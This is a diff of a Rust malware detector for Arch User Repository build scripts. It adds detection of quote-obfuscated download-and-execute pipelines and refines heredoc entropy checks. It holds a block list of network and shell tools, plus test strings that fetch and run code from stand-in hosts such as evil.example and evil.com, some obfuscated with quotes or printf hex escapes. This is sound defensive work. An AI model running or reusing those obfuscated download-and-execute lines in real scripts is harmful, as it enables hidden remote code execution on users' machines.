@@ -7,22 +7,57 @@ use std::sync::LazyLock;
 
 /// PKGBUILD standard variables that should not be tracked for obfuscation.
 const PKGBUILD_STANDARD_VARS: &[&str] = &[
-    "pkgname", "pkgver", "pkgrel", "epoch", "pkgdesc", "arch", "url", "license",
-    "groups", "depends", "makedepends", "checkdepends", "optdepends", "provides",
-    "conflicts", "replaces", "backup", "options", "install", "changelog", "source",
-    "noextract", "md5sums", "sha1sums", "sha224sums", "sha256sums", "sha384sums",
-    "sha512sums", "b2sums", "validpgpkeys",
+    "pkgname",
+    "pkgver",
+    "pkgrel",
+    "epoch",
+    "pkgdesc",
+    "arch",
+    "url",
+    "license",
+    "groups",
+    "depends",
+    "makedepends",
+    "checkdepends",
+    "optdepends",
+    "provides",
+    "conflicts",
+    "replaces",
+    "backup",
+    "options",
+    "install",
+    "changelog",
+    "source",
+    "noextract",
+    "md5sums",
+    "sha1sums",
+    "sha224sums",
+    "sha256sums",
+    "sha384sums",
+    "sha512sums",
+    "b2sums",
+    "validpgpkeys",
     // Common build environment variables
-    "CFLAGS", "CXXFLAGS", "CPPFLAGS", "LDFLAGS", "GOFLAGS", "CGO_CFLAGS",
-    "CGO_CPPFLAGS", "CGO_CXXFLAGS", "CGO_LDFLAGS", "MAKEFLAGS",
+    "CFLAGS",
+    "CXXFLAGS",
+    "CPPFLAGS",
+    "LDFLAGS",
+    "GOFLAGS",
+    "CGO_CFLAGS",
+    "CGO_CPPFLAGS",
+    "CGO_CXXFLAGS",
+    "CGO_LDFLAGS",
+    "MAKEFLAGS",
     // PKGBUILD special variables
-    "srcdir", "pkgdir", "startdir",
+    "srcdir",
+    "pkgdir",
+    "startdir",
 ];
 
 /// Commands that indicate malicious intent when reconstructed via obfuscation.
 const DANGEROUS_COMMANDS: &[&str] = &[
-    "curl", "wget", "nc", "ncat", "bash", "sh", "python", "python3", "python2",
-    "perl", "ruby", "php", "lua", "socat", "telnet",
+    "curl", "wget", "nc", "ncat", "bash", "sh", "python", "python3", "python2", "perl", "ruby",
+    "php", "lua", "socat", "telnet",
 ];
 
 /// Download-and-execute compound patterns: (downloader, executor).
@@ -39,9 +74,27 @@ const DANGEROUS_PIPES: &[(&str, &str)] = &[
 
 /// Build tool commands whose presence indicates legitimate compilation.
 const BUILD_COMMANDS: &[&str] = &[
-    "make", "cmake", "cargo", "gcc", "g++", "go build", "go install", "rustc",
-    "javac", "mvn", "gradle", "meson", "ninja", "configure", "python setup.py",
-    "pip install", "npm run build", "yarn build", "qmake", "scons", "waf",
+    "make",
+    "cmake",
+    "cargo",
+    "gcc",
+    "g++",
+    "go build",
+    "go install",
+    "rustc",
+    "javac",
+    "mvn",
+    "gradle",
+    "meson",
+    "ninja",
+    "configure",
+    "python setup.py",
+    "pip install",
+    "npm run build",
+    "yarn build",
+    "qmake",
+    "scons",
+    "waf",
 ];
 
 // --- Regexes (compiled once) ---
@@ -49,14 +102,12 @@ const BUILD_COMMANDS: &[&str] = &[
 /// Matches simple variable assignments: VAR=value, VAR="value", VAR='value'
 /// Also handles semicolon-separated: a=cu;b=rl
 static ASSIGN_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r#"(?:^|;)\s*([A-Za-z_][A-Za-z0-9_]*)=(?:"([^"]*)"|'([^']*)'|([^;"'\s]*))"#)
-        .unwrap()
+    Regex::new(r#"(?:^|;)\s*([A-Za-z_][A-Za-z0-9_]*)=(?:"([^"]*)"|'([^']*)'|([^;"'\s]*))"#).unwrap()
 });
 
 /// Matches variable references: $VAR or ${VAR}
-static VAR_REF_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?").unwrap()
-});
+static VAR_REF_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?").unwrap());
 
 /// Matches $(printf '\xNN') or $(printf '\NNN') subshells
 static PRINTF_SUBSHELL_RE: LazyLock<Regex> = LazyLock::new(|| {
@@ -65,44 +116,47 @@ static PRINTF_SUBSHELL_RE: LazyLock<Regex> = LazyLock::new(|| {
 
 /// Matches $(echo -e '\xNN') subshells
 static ECHO_SUBSHELL_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r#"\$\(\s*echo\s+-[neE]+\s+['"]?\\+(x[0-9a-fA-F]{2}|[0-7]{3})['"]?\s*\)"#)
-        .unwrap()
+    Regex::new(r#"\$\(\s*echo\s+-[neE]+\s+['"]?\\+(x[0-9a-fA-F]{2}|[0-7]{3})['"]?\s*\)"#).unwrap()
 });
 
 /// Long hex string (129+ hex chars; 128 = SHA-512, so 129+ avoids checksum FPs)
-static LONG_HEX_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"[0-9a-fA-F]{129,}").unwrap()
-});
+static LONG_HEX_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[0-9a-fA-F]{129,}").unwrap());
 
 /// Checksum array line (declaration)
-static CHECKSUM_LINE_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"(?i)(md5|sha\d+|b2)sums").unwrap()
-});
+static CHECKSUM_LINE_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?i)(md5|sha\d+|b2)sums").unwrap());
 
 /// Checksum array opening: sha256sums=( or sha256sums_x86_64=(
-static CHECKSUM_ARRAY_OPEN_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"(?i)(md5|sha\d+|b2)sums(_[a-zA-Z0-9_]+)?\s*=\s*\(").unwrap()
-});
+static CHECKSUM_ARRAY_OPEN_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?i)(md5|sha\d+|b2)sums(_[a-zA-Z0-9_]+)?\s*=\s*\(").unwrap());
 
 /// Long base64 string (100+ chars of base64 alphabet)
-static LONG_BASE64_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"[A-Za-z0-9+/]{100,}={0,3}").unwrap()
+static LONG_BASE64_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"[A-Za-z0-9+/]{100,}={0,3}").unwrap());
+
+/// Heredoc start with shell quote/escape fragments preserved for quote removal:
+/// `<<EOF`, `<<'EOF'`, `<<\EOF`, `<<E"OF"`, and `<<-EOF`.
+static HEREDOC_START_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"(<<-?)[ \t]*((?:\\.|'[^']*'|"[^"]*"|[A-Za-z0-9_.-])+)(?:[ \t]|$|[;&|<>#])"#)
+        .unwrap()
 });
 
-/// Heredoc start: <<EOF, <<'EOF', <<"EOF", <<-EOF
-static HEREDOC_START_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r#"<<-?\s*['"]?(\w+)['"]?"#).unwrap()
+/// A high-entropy heredoc is only actionable when its bytes flow directly into
+/// an interpreter or decoder. Plain `cat <<EOF` is commonly used to generate
+/// legitimate wrapper scripts and configuration files.
+static HEREDOC_DIRECT_SINK_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(
+        r"(?i)(?:^|[|;&]\s*)(?:bash|sh|python[23]?|perl|ruby|php|lua|node|eval|base64\b[^|;&]*(?:-d|--decode)|base32\b[^|;&]*(?:-d|--decode)|xxd\b[^|;&]*-r|openssl\b[^|;&]*(?:-d|enc\s+-d))\b[^#\n]*<<|<<[^#\n]*\|\s*(?:bash|sh|python[23]?|perl|ruby|php|lua|node)\b",
+    )
+    .unwrap()
 });
 
 /// Download to file: curl -o, curl -O, wget -O, curl ... > file
-static DOWNLOAD_TO_FILE_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"(curl\s+.*-[oO]\s|wget\s+.*-O\s|curl\s+.*>\s)").unwrap()
-});
+static DOWNLOAD_TO_FILE_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(curl\s+.*-[oO]\s|wget\s+.*-O\s|curl\s+.*>\s)").unwrap());
 
 /// chmod +x
-static CHMOD_EXEC_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"chmod\s+\+x\s").unwrap()
-});
+static CHMOD_EXEC_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"chmod\s+\+x\s").unwrap());
 
 // --- Feature ---
 
@@ -131,6 +185,7 @@ fn analyze_content(content: &str, id_prefix: &str, desc_suffix: &str) -> Vec<Sig
     signals.extend(analyze_charbychar_construction(content));
     signals.extend(analyze_data_blobs(content));
     signals.extend(analyze_binary_download(content));
+    signals.extend(analyze_obfuscated_download_execute(content));
 
     if !id_prefix.is_empty() {
         for sig in &mut signals {
@@ -140,6 +195,30 @@ fn analyze_content(content: &str, id_prefix: &str, desc_suffix: &str) -> Vec<Sig
     }
 
     signals
+}
+
+/// Detect shell-equivalent command words hidden by adjacent quotes or escapes,
+/// such as `cu""rl ... | ba""sh`.
+fn analyze_obfuscated_download_execute(content: &str) -> Vec<Signal> {
+    let Some(finding) = crate::shared::shell_syntax::find_obfuscated_download_execute(content)
+    else {
+        return Vec::new();
+    };
+
+    vec![Signal {
+        id: "SA-QUOTED-DOWNLOAD-EXEC".to_string(),
+        category: SignalCategory::Pkgbuild,
+        points: 90,
+        description: format!(
+            "shell quoting reconstructs download-and-execute pipeline '{}|{}' (line {})",
+            finding.downloader, finding.executor, finding.line
+        ),
+        is_override_gate: true,
+        matched_line: content
+            .lines()
+            .nth(finding.line.saturating_sub(1))
+            .map(|line| line.trim().to_string()),
+    }]
 }
 
 // --- Helpers ---
@@ -238,9 +317,7 @@ fn contains_multi_var_dangerous_cmd(
             }
             // Skip if any single variable already holds this command —
             // SA-INDIRECT-EXEC handles that case with execution-position checking.
-            let single_var_holds_it = env
-                .values()
-                .any(|v| has_word_match(&v.to_lowercase(), cmd));
+            let single_var_holds_it = env.values().any(|v| has_word_match(&v.to_lowercase(), cmd));
             !single_var_holds_it
         })
         .copied()
@@ -249,10 +326,7 @@ fn contains_multi_var_dangerous_cmd(
 // --- Sub-Analyzers ---
 
 /// Detect variable concatenation that resolves to dangerous commands.
-fn analyze_variable_resolution(
-    content: &str,
-    env: &HashMap<String, String>,
-) -> Vec<Signal> {
+fn analyze_variable_resolution(content: &str, env: &HashMap<String, String>) -> Vec<Signal> {
     let mut signals = Vec::new();
     let mut found_exec = false;
     let mut found_cmd = false;
@@ -269,9 +343,7 @@ fn analyze_variable_resolution(
         }
 
         // Check for download-and-execute pipe
-        if !found_exec
-            && let Some((dl, exec)) = contains_dangerous_pipe(&resolved)
-        {
+        if !found_exec && let Some((dl, exec)) = contains_dangerous_pipe(&resolved) {
             // Only flag if the original line didn't already have this pattern
             let orig_lower = line.to_lowercase();
             if !(orig_lower.contains(dl) && orig_lower.contains(exec)) {
@@ -294,9 +366,7 @@ fn analyze_variable_resolution(
         }
 
         // Check for dangerous command appearing after resolution
-        if !found_cmd
-            && let Some(cmd) = contains_multi_var_dangerous_cmd(line, &resolved, env)
-        {
+        if !found_cmd && let Some(cmd) = contains_multi_var_dangerous_cmd(line, &resolved, env) {
             signals.push(Signal {
                 id: "SA-VAR-CONCAT-CMD".to_string(),
                 category: SignalCategory::Pkgbuild,
@@ -321,10 +391,7 @@ fn analyze_variable_resolution(
 }
 
 /// Detect variables holding dangerous commands used in execution position.
-fn analyze_indirect_execution(
-    content: &str,
-    env: &HashMap<String, String>,
-) -> Vec<Signal> {
+fn analyze_indirect_execution(content: &str, env: &HashMap<String, String>) -> Vec<Signal> {
     // Find variables whose values are dangerous commands
     let dangerous_vars: Vec<(&str, &str)> = env
         .iter()
@@ -422,8 +489,7 @@ fn analyze_data_blobs(content: &str) -> Vec<Signal> {
         }
 
         // Long hex strings
-        if signals.iter().all(|s: &Signal| s.id != "SA-DATA-BLOB-HEX")
-            && LONG_HEX_RE.is_match(line)
+        if signals.iter().all(|s: &Signal| s.id != "SA-DATA-BLOB-HEX") && LONG_HEX_RE.is_match(line)
         {
             signals.push(Signal {
                 id: "SA-DATA-BLOB-HEX".to_string(),
@@ -436,7 +502,9 @@ fn analyze_data_blobs(content: &str) -> Vec<Signal> {
         }
 
         // Long base64 strings
-        if signals.iter().all(|s: &Signal| s.id != "SA-DATA-BLOB-BASE64")
+        if signals
+            .iter()
+            .all(|s: &Signal| s.id != "SA-DATA-BLOB-BASE64")
             && LONG_BASE64_RE.is_match(line)
         {
             // Avoid flagging lines that also match hex (already caught above)
@@ -466,12 +534,21 @@ fn analyze_heredoc_entropy(content: &str) -> Vec<Signal> {
     let mut i = 0;
 
     while i < lines.len() {
-        if let Some(caps) = HEREDOC_START_RE.captures(lines[i]) {
-            let delimiter = &caps[1];
+        if HEREDOC_DIRECT_SINK_RE.is_match(lines[i])
+            && let Some(caps) = HEREDOC_START_RE.captures(lines[i])
+        {
+            let start_line = lines[i];
+            let strip_tabs = &caps[1] == "<<-";
+            let delimiter = quote_removed_heredoc_word(&caps[2]);
             let mut body = String::new();
             i += 1;
             while i < lines.len() {
-                if lines[i].trim() == delimiter {
+                let candidate = if strip_tabs {
+                    lines[i].trim_start_matches('\t')
+                } else {
+                    lines[i]
+                };
+                if candidate == delimiter {
                     break;
                 }
                 body.push_str(lines[i]);
@@ -492,7 +569,7 @@ fn analyze_heredoc_entropy(content: &str) -> Vec<Signal> {
                             body.len()
                         ),
                         is_override_gate: false,
-                        matched_line: None,
+                        matched_line: Some(start_line.trim().to_string()),
                     }];
                 }
             }
@@ -501,6 +578,37 @@ fn analyze_heredoc_entropy(content: &str) -> Vec<Signal> {
     }
 
     Vec::new()
+}
+
+fn quote_removed_heredoc_word(word: &str) -> String {
+    let mut delimiter = String::with_capacity(word.len());
+    let mut quote = None;
+    let mut escaped = false;
+
+    for character in word.chars() {
+        if escaped {
+            delimiter.push(character);
+            escaped = false;
+            continue;
+        }
+        if let Some(quote_character) = quote {
+            if character == quote_character {
+                quote = None;
+            } else if character == '\\' && quote_character == '"' {
+                escaped = true;
+            } else {
+                delimiter.push(character);
+            }
+            continue;
+        }
+        match character {
+            '\'' | '"' => quote = Some(character),
+            '\\' => escaped = true,
+            _ => delimiter.push(character),
+        }
+    }
+
+    delimiter
 }
 
 /// Calculate Shannon entropy in bits per byte.
@@ -568,7 +676,11 @@ mod tests {
             github_not_found: false,
             aur_comments: vec![],
         };
-        ShellAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect()
+        ShellAnalysis
+            .analyze(&ctx)
+            .iter()
+            .map(|s| s.id.clone())
+            .collect()
     }
 
     fn has(ids: &[String], id: &str) -> bool {
@@ -619,27 +731,39 @@ mod tests {
         // Single variable holding "python3" should NOT fire SA-VAR-CONCAT-CMD
         // (SA-INDIRECT-EXEC handles single-variable cases)
         let ids = analyze("_py=python3\n$_py setup.py install");
-        assert!(!has(&ids, "SA-VAR-CONCAT-CMD"), "single var python3 should not fire, got: {ids:?}");
+        assert!(
+            !has(&ids, "SA-VAR-CONCAT-CMD"),
+            "single var python3 should not fire, got: {ids:?}"
+        );
     }
 
     #[test]
     fn var_concat_single_var_sh_no_signal() {
         let ids = analyze("_shell=sh\n$_shell -c 'echo hello'");
-        assert!(!has(&ids, "SA-VAR-CONCAT-CMD"), "single var sh should not fire, got: {ids:?}");
+        assert!(
+            !has(&ids, "SA-VAR-CONCAT-CMD"),
+            "single var sh should not fire, got: {ids:?}"
+        );
     }
 
     #[test]
     fn var_concat_multi_var_still_fires() {
         // Multi-variable concatenation SHOULD still fire
         let ids = analyze("a=cu\nb=rl\n$a$b http://evil.com -O /tmp/x");
-        assert!(has(&ids, "SA-VAR-CONCAT-CMD"), "multi-var concat should fire, got: {ids:?}");
+        assert!(
+            has(&ids, "SA-VAR-CONCAT-CMD"),
+            "multi-var concat should fire, got: {ids:?}"
+        );
     }
 
     #[test]
     fn var_concat_word_boundary_no_substring() {
         // "_fisher=fisher" should NOT match "sh" as a substring
         let ids = analyze("_fisher=fisher\necho $_fisher");
-        assert!(!has(&ids, "SA-VAR-CONCAT-CMD"), "fisher should not match sh, got: {ids:?}");
+        assert!(
+            !has(&ids, "SA-VAR-CONCAT-CMD"),
+            "fisher should not match sh, got: {ids:?}"
+        );
     }
 
     #[test]
@@ -654,6 +778,18 @@ mod tests {
         // curl is already visible in the original line, should not double-flag
         let ids = analyze("x=foo\ncurl http://example.com | bash");
         assert!(!has(&ids, "SA-VAR-CONCAT-EXEC"));
+    }
+
+    #[test]
+    fn adjacent_quotes_cannot_hide_curl_pipe_bash() {
+        let ids = analyze(r#"cu""rl https://evil.example/payload | ba""sh"#);
+        assert!(has(&ids, "SA-QUOTED-DOWNLOAD-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn quoted_pipeline_text_is_not_executable() {
+        let ids = analyze(r#"echo "cu''rl https://example.test | ba''sh""#);
+        assert!(!has(&ids, "SA-QUOTED-DOWNLOAD-EXEC"), "got: {ids:?}");
     }
 
     // --- Indirect Execution ---
@@ -692,24 +828,21 @@ mod tests {
 
     #[test]
     fn charbychar_printf_subshells() {
-        let ids =
-            analyze(r"$(printf '\x63')$(printf '\x75')$(printf '\x72')$(printf '\x6c') http://evil.com");
+        let ids = analyze(
+            r"$(printf '\x63')$(printf '\x75')$(printf '\x72')$(printf '\x6c') http://evil.com",
+        );
         assert!(has(&ids, "SA-CHARBYCHAR-CONSTRUCT"));
     }
 
     #[test]
     fn charbychar_echo_subshells() {
-        let ids = analyze(
-            r"$(echo -e '\x62')$(echo -e '\x61')$(echo -e '\x73')$(echo -e '\x68')",
-        );
+        let ids = analyze(r"$(echo -e '\x62')$(echo -e '\x61')$(echo -e '\x73')$(echo -e '\x68')");
         assert!(has(&ids, "SA-CHARBYCHAR-CONSTRUCT"));
     }
 
     #[test]
     fn charbychar_mixed_printf_echo() {
-        let ids = analyze(
-            r"$(printf '\x63')$(echo -e '\x75')$(printf '\x72')$(printf '\x6c')",
-        );
+        let ids = analyze(r"$(printf '\x63')$(echo -e '\x75')$(printf '\x72')$(printf '\x6c')");
         assert!(has(&ids, "SA-CHARBYCHAR-CONSTRUCT"));
     }
 
@@ -755,8 +888,40 @@ mod tests {
         let body: String = (0..300)
             .map(|i| (33 + ((i * 7 + 13) % 94)) as u8 as char)
             .collect();
-        let ids = analyze(&format!("cat <<EOF\n{body}\nEOF"));
+        let ids = analyze(&format!("bash <<EOF\n{body}\nEOF"));
         assert!(has(&ids, "SA-HIGH-ENTROPY-HEREDOC"));
+    }
+
+    #[test]
+    fn arithmetic_shift_does_not_mask_later_executable_heredoc() {
+        let body: String = (0..300)
+            .map(|i| (33 + ((i * 7 + 13) % 94)) as u8 as char)
+            .collect();
+        let ids = analyze(&format!("value=$((1 << 2))\nbash <<EOF\n{body}\nEOF"));
+        assert!(has(&ids, "SA-HIGH-ENTROPY-HEREDOC"));
+    }
+
+    #[test]
+    fn quoted_and_escaped_heredoc_delimiters_are_quote_removed() {
+        let body: String = (0..300)
+            .map(|i| (33 + ((i * 7 + 13) % 94)) as u8 as char)
+            .collect();
+        for declaration in [r#"bash <<E"OF""#, r"bash <<\EOF"] {
+            let ids = analyze(&format!("{declaration}\n{body}\nEOF"));
+            assert!(has(&ids, "SA-HIGH-ENTROPY-HEREDOC"), "missed {declaration}");
+        }
+    }
+
+    #[test]
+    fn high_entropy_generated_file_without_sink_has_no_signal() {
+        let body: String = (0..300)
+            .map(|i| (33 + ((i * 7 + 13) % 94)) as u8 as char)
+            .collect();
+        let ids = analyze(&format!("cat > wrapper.sh <<'EOF'\n{body}\nEOF"));
+        assert!(
+            !has(&ids, "SA-HIGH-ENTROPY-HEREDOC"),
+            "generated text without a direct execution/decode sink should not trigger: {ids:?}"
+        );
     }
 
     #[test]
@@ -770,9 +935,7 @@ mod tests {
 
     #[test]
     fn binary_download_no_build() {
-        let ids = analyze(
-            "curl -o /tmp/tool https://evil.com/tool\nchmod +x /tmp/tool\n/tmp/tool",
-        );
+        let ids = analyze("curl -o /tmp/tool https://evil.com/tool\nchmod +x /tmp/tool\n/tmp/tool");
         assert!(has(&ids, "SA-BINARY-DOWNLOAD-NOCOMPILE"));
     }
 
@@ -825,7 +988,10 @@ package() {
 }
 "#,
         );
-        assert!(ids.is_empty(), "benign PKGBUILD should trigger no signals, got: {ids:?}");
+        assert!(
+            ids.is_empty(),
+            "benign PKGBUILD should trigger no signals, got: {ids:?}"
+        );
     }
 
     // --- SHA-512 checksum false positive regression ---
@@ -834,7 +1000,10 @@ package() {
     fn data_blob_sha512_not_flagged() {
         let sha512 = "a1".repeat(64); // exactly 128 hex chars = SHA-512
         let ids = analyze(&format!("sha512sums=('{sha512}')"));
-        assert!(!has(&ids, "SA-DATA-BLOB-HEX"), "SHA-512 checksum should not trigger");
+        assert!(
+            !has(&ids, "SA-DATA-BLOB-HEX"),
+            "SHA-512 checksum should not trigger"
+        );
     }
 
     #[test]
@@ -842,7 +1011,10 @@ package() {
         let sha512 = "a1".repeat(64);
         let content = format!("sha512sums=('{sha512}'\n            '{sha512}')");
         let ids = analyze(&content);
-        assert!(!has(&ids, "SA-DATA-BLOB-HEX"), "SHA-512 in multi-line array should not trigger");
+        assert!(
+            !has(&ids, "SA-DATA-BLOB-HEX"),
+            "SHA-512 in multi-line array should not trigger"
+        );
     }
 
     // --- Install script analysis ---
@@ -860,7 +1032,11 @@ package() {
             github_not_found: false,
             aur_comments: vec![],
         };
-        ShellAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect()
+        ShellAnalysis
+            .analyze(&ctx)
+            .iter()
+            .map(|s| s.id.clone())
+            .collect()
     }
 
     #[test]
@@ -901,6 +1077,9 @@ package() {
     #[test]
     fn install_benign_no_signals() {
         let ids = analyze_install("post_install() {\n    echo 'Done'\n}");
-        assert!(ids.is_empty(), "benign install script should trigger no signals, got: {ids:?}");
+        assert!(
+            ids.is_empty(),
+            "benign install script should trigger no signals, got: {ids:?}"
+        );
     }
 }
